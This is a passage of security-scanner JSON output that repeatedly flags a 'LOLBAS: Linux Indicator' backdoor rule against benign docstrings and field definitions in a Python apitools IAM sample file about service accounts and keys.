          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 507,
                  "startColumn": 33,
                  "endLine": 507,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  r\"\"\"The service account keys list response.\n\n  Fields:\n    keys: The public keys for the service account.\n  \"\"\"\n\n  keys = _messages.MessageField('ServiceAccountKey', 1, repeated=True)\n",
                    "rendered": {
                      "text": "  r\"\"\"The service account keys list response.\n\n  Fields:\n    keys: The public keys for the service account.\n  \"\"\"\n\n  keys = _messages.MessageField('ServiceAccountKey', 1, repeated=True)\n",
                      "markdown": "`  r\"\"\"The service account keys list response.\n\n  Fields:\n    keys: The public keys for the service account.\n  \"\"\"\n\n  keys = _messages.MessageField('ServiceAccountKey', 1, repeated=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 504,
                  "startColumn": 9,
                  "endLine": 504,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass ListServiceAccountKeysResponse(_messages.Message):\n  r\"\"\"The service account keys list response.\n\n  Fields:\n    keys: The public keys for the service account.\n",
                    "rendered": {
                      "text": "\n\nclass ListServiceAccountKeysResponse(_messages.Message):\n  r\"\"\"The service account keys list response.\n\n  Fields:\n    keys: The public keys for the service account.\n",
                      "markdown": "`\n\nclass ListServiceAccountKeysResponse(_messages.Message):\n  r\"\"\"The service account keys list response.\n\n  Fields:\n    keys: The public keys for the service account.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 476,
                  "startColumn": 64,
                  "endLine": 477,
                  "snippet": {
                    "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n    signJwtRequest: A SignJwtRequest resource to be passed as the request\n      body.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n    signJwtRequest: A SignJwtRequest resource to be passed as the request\n      body.\n  \"\"\"\n",
                      "markdown": "`    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n    signJwtRequest: A SignJwtRequest resource to be passed as the request\n      body.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 473,
                  "startColumn": 34,
                  "endLine": 473,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  r\"\"\"A IamProjectsServiceAccountsSignJwtRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                    "rendered": {
                      "text": "  r\"\"\"A IamProjectsServiceAccountsSignJwtRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                      "markdown": "`  r\"\"\"A IamProjectsServiceAccountsSignJwtRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 459,
                  "startColumn": 64,
                  "endLine": 460,
                  "snippet": {
                    "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n    signBlobRequest: A SignBlobRequest resource to be passed as the request\n      body.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n    signBlobRequest: A SignBlobRequest resource to be passed as the request\n      body.\n  \"\"\"\n",
                      "markdown": "`    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n    signBlobRequest: A SignBlobRequest resource to be passed as the request\n      body.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 456,
                  "startColumn": 34,
                  "endLine": 456,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  r\"\"\"A IamProjectsServiceAccountsSignBlobRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                    "rendered": {
                      "text": "  r\"\"\"A IamProjectsServiceAccountsSignBlobRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                      "markdown": "`  r\"\"\"A IamProjectsServiceAccountsSignBlobRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 424,
                  "startColumn": 45,
                  "endLine": 424,
                  "endColumn": 54,
                  "snippet": {
                    "text": "      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n    pageToken: Optional pagination token returned in an earlier\n      ListServiceAccountsResponse.next_page_token.\n    removeDeletedServiceAccounts: Do not list service accounts deleted from\n      Gaia. <b><font color=\"red\">DO NOT INCLUDE IN EXTERNAL\n      DOCUMENTATION</font></b>.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n    pageToken: Optional pagination token returned in an earlier\n      ListServiceAccountsResponse.next_page_token.\n    removeDeletedServiceAccounts: Do not list service accounts deleted from\n      Gaia. <b><font color=\"red\">DO NOT INCLUDE IN EXTERNAL\n      DOCUMENTATION</font></b>.\n  \"\"\"\n",
                      "markdown": "`      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n    pageToken: Optional pagination token returned in an earlier\n      ListServiceAccountsResponse.next_page_token.\n    removeDeletedServiceAccounts: Do not list service accounts deleted from\n      Gaia. <b><font color=\"red\">DO NOT INCLUDE IN EXTERNAL\n      DOCUMENTATION</font></b>.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 419,
                  "startColumn": 45,
                  "endLine": 419,
                  "endColumn": 54,
                  "snippet": {
                    "text": "  Fields:\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n    pageSize: Optional limit on the number of service accounts to include in\n      the response. Further accounts can subsequently be obtained by including\n      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n    pageToken: Optional pagination token returned in an earlier\n",
                    "rendered": {
                      "text": "  Fields:\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n    pageSize: Optional limit on the number of service accounts to include in\n      the response. Further accounts can subsequently be obtained by including\n      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n    pageToken: Optional pagination token returned in an earlier\n",
                      "markdown": "`  Fields:\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n    pageSize: Optional limit on the number of service accounts to include in\n      the response. Further accounts can subsequently be obtained by including\n      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n    pageToken: Optional pagination token returned in an earlier\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 418,
                  "startColumn": 5,
                  "endLine": 418,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n  Fields:\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n    pageSize: Optional limit on the number of service accounts to include in\n      the response. Further accounts can subsequently be obtained by including\n      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n",
                    "rendered": {
                      "text": "\n  Fields:\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n    pageSize: Optional limit on the number of service accounts to include in\n      the response. Further accounts can subsequently be obtained by including\n      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n",
                      "markdown": "`\n  Fields:\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n    pageSize: Optional limit on the number of service accounts to include in\n      the response. Further accounts can subsequently be obtained by including\n      the ListServiceAccountsResponse.next_page_token in a subsequent request.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 64,
                  "endLine": 392,
                  "snippet": {
                    "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Using `-` as a wildcard\n      for the project, will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  class KeyTypesValueValuesEnum(_messages.Enum):\n",
                    "rendered": {
                      "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Using `-` as a wildcard\n      for the project, will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  class KeyTypesValueValuesEnum(_messages.Enum):\n",
                      "markdown": "`    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Using `-` as a wildcard\n      for the project, will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  class KeyTypesValueValuesEnum(_messages.Enum):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 388,
                  "startColumn": 34,
                  "endLine": 388,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    keyTypes: Filters the types of keys the user wants to include in the list\n      response. Duplicate key types are not allowed. If no key type is\n      provided, all keys are returned.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Using `-` as a wildcard\n      for the project, will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                    "rendered": {
                      "text": "    keyTypes: Filters the types of keys the user wants to include in the list\n      response. Duplicate key types are not allowed. If no key type is\n      provided, all keys are returned.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Using `-` as a wildcard\n      for the project, will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                      "markdown": "`    keyTypes: Filters the types of keys the user wants to include in the list\n      response. Duplicate key types are not allowed. If no key type is\n      provided, all keys are returned.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`.  Using `-` as a wildcard\n      for the project, will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 354,
                  "startColumn": 24,
                  "endLine": 354,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n      Using `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n      `unique_id` of the service account.\n    publicKeyType: The output format of the public key requested. X509_PEM is\n      the default output format.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n      Using `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n      `unique_id` of the service account.\n    publicKeyType: The output format of the public key requested. X509_PEM is\n      the default output format.\n  \"\"\"\n",
                      "markdown": "`      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n      Using `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n      `unique_id` of the service account.\n    publicKeyType: The output format of the public key requested. X509_PEM is\n      the default output format.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 350,
                  "startColumn": 34,
                  "endLine": 350,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      requested. X509_PEM is the default output format.\n\n  Fields:\n    name: The resource name of the service account key in the following\n      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n      Using `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n",
                    "rendered": {
                      "text": "      requested. X509_PEM is the default output format.\n\n  Fields:\n    name: The resource name of the service account key in the following\n      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n      Using `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n",
                      "markdown": "`      requested. X509_PEM is the default output format.\n\n  Fields:\n    name: The resource name of the service account key in the following\n      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n      Using `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 336,
                  "startColumn": 24,
                  "endLine": 336,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`. Using\n      `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n      `unique_id` of the service account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n",
                    "rendered": {
                      "text": "      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`. Using\n      `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n      `unique_id` of the service account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n",
                      "markdown": "`      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`. Using\n      `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n      `unique_id` of the service account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 34,
                  "endLine": 332,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  r\"\"\"A IamProjectsServiceAccountsKeysDeleteRequest object.\n\n  Fields:\n    name: The resource name of the service account key in the following\n      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`. Using\n      `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n",
                    "rendered": {
                      "text": "  r\"\"\"A IamProjectsServiceAccountsKeysDeleteRequest object.\n\n  Fields:\n    name: The resource name of the service account key in the following\n      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`. Using\n      `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n",
                      "markdown": "`  r\"\"\"A IamProjectsServiceAccountsKeysDeleteRequest object.\n\n  Fields:\n    name: The resource name of the service account key in the following\n      format: `projects/{project}/serviceAccounts/{account}/keys/{key}`. Using\n      `-` as a wildcard for the project will infer the project from the\n      account. The `account` value can be the `email` address or the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 320,
                  "startColumn": 64,
                  "endLine": 321,
                  "snippet": {
                    "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  createServiceAccountKeyRequest = _messages.MessageField('CreateServiceAccountKeyRequest', 1)\n",
                    "rendered": {
                      "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  createServiceAccountKeyRequest = _messages.MessageField('CreateServiceAccountKeyRequest', 1)\n",
                      "markdown": "`    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  createServiceAccountKeyRequest = _messages.MessageField('CreateServiceAccountKeyRequest', 1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 317,
                  "startColumn": 34,
                  "endLine": 317,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  Fields:\n    createServiceAccountKeyRequest: A CreateServiceAccountKeyRequest resource\n      to be passed as the request body.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                    "rendered": {
                      "text": "  Fields:\n    createServiceAccountKeyRequest: A CreateServiceAccountKeyRequest resource\n      to be passed as the request body.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                      "markdown": "`  Fields:\n    createServiceAccountKeyRequest: A CreateServiceAccountKeyRequest resource\n      to be passed as the request body.\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 64,
                  "endLine": 305,
                  "snippet": {
                    "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n",
                    "rendered": {
                      "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n",
                      "markdown": "`    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 301,
                  "startColumn": 34,
                  "endLine": 301,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  r\"\"\"A IamProjectsServiceAccountsGetRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                    "rendered": {
                      "text": "  r\"\"\"A IamProjectsServiceAccountsGetRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                      "markdown": "`  r\"\"\"A IamProjectsServiceAccountsGetRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 272,
                  "startColumn": 64,
                  "endLine": 273,
                  "snippet": {
                    "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n",
                    "rendered": {
                      "text": "    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n",
                      "markdown": "`    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n      account.\n  \"\"\"\n\n  name = _messages.StringField(1, required=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 269,
                  "startColumn": 34,
                  "endLine": 269,
                  "endColumn": 43,
                  "snippet": {
